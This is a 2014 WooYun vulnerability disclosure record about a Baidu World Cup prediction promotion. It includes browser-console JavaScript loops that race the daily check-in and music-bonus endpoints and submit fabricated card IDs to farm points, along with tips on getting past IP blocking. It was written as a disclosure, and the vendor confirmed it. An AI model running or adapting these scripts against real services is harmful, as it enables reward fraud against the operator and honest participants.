{"id": 54122, "wybug_id": "wooyun-2014-065458", "wybug_title": "百度首页2014巴西世界杯竞猜应用刷分bug", "wybug_corp": "百度", "wybug_author": "小虫", "wybug_date": "2014-06-19 09:56", "wybug_open_date": "2014-08-03 09:58", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向公众公开  简要描述： 百度首页目前有个世界杯的竞猜活动，这个活动存在bug，每天可以额外领取很多积分。 详细说明：  首先，我对于自己第一次提交bug的态度表示歉意，当时过于着急，就没仔细说明。我用的是火狐浏览器，当然谷歌也可以，在登录了百度之后，就相当于拿到了cookie信息，这时打开控制台，在里边输入js脚本，可以直接与服务器通讯。1.每日签到，可以通过高并发的原理，就是一个for循环，999次，最少成功3次，最多的时候成功了7次。这个技巧是先不要登录帐号，直接请求，这时百度会封了你的ip，让你输验证码，输完之后就可以放心请求了，否则请求被封，成功率大大下降。示例代码：\nfor(var i=0;i<999;i++){  $.ajax({      \"url\": \"http://www.baidu.com/home/xman/submit/worldcupgetpoint\",      \"type\": \"post\",      data: {          \"_req_seqid\": \"\",          \"bsToken\": \"\",          \"sid\": \"\"      }  });}\n你没有看错，参数为空都可以！！2.原理和1相同，只不过请求的地址换了换，这个是在线听歌，每日+10分。示例代码：\nvar _sid = bds.comm.indexSid;var _bsToken = $(\"#bsToken\").val();var __req_seqid = s_session.seqId;for(var i=0;i<999;i++){  $.ajax({      \"url\": \"http://www.baidu.com/home/xman/submit/worldcupmusic\",      \"type\": \"post\",      data: {          \"_req_seqid\": __req_seqid,          \"bsToken\": _bsToken,          \"sid\": _sid      }  });}\n3.这个也是最严重的bug了。本来设计的预想是每当使用一个百度首页的卡片，像什么“团购”、“星座”之类的，就奖励10分。虽然这些卡片的数量是有限的，但是每个卡片都有id，我们可以构造一个不存在的id，来骗取积分。很遗憾，百度有没有过滤，真的成功了，而且每天都能刷，一天600左右积分。这个技巧是，如果发现代码无效，试着把_wordcupIndex这个基数换一换，比如改成-10，或者9999之类的。一定能成功！\nvar _wordcupIndex = 10;var _sid = bds.comm.indexSid;var _bsToken = $(\"#bsToken\").val();var __req_seqid = s_session.seqId;var _ids = \"\";setInterval(function(){  _wordcupIndex++;  _ids = \"1,2,9,3,\"+_wordcupIndex+\",4\";  $.ajax({    \"url\": \"http://www.baidu.com/home/xman/submit/supermod\",    \"type\": \"post\",    data: {        \"_req_seqid\": __req_seqid,        \"bsToken\": _bsToken,        \"cmd\": \"add\",        \"id\": _wordcupIndex,        \"ids\": _ids,        \"sid\": _sid    }  });},1000);\n   漏洞证明：  我的百度帐号是kpdown今天早上没刷的时候是20分\n\n刷完之后，变成了660分\n\n正常情况下，一天时间，不可能获得这么多（竞猜赢的不算）。   修复方案：  对于1和2，高并发的漏洞很难控制，效率和安全不可兼得，具体如何处理，要看百度技术的决策。但是3这个漏洞，就很让人生气了，像登录那样验证一下有没有加过分不就可以了。。。我真怀疑是不是故意的。鉴于这个活动的奖品丰厚，希望百度能够重视。我是一名java web开发，对于白帽测试，不是那么专业，但希望能够多学习，见谅！   版权声明：转载请注明来源 小虫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-19 11:06 厂商回复： 我们会尽快处理此问题，感谢对百度安全的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-19 17:48 |    \t\t丁小乐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 新手上路)\t\t \n  好贱啊。。刷的好好的刚赚点京东卡。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}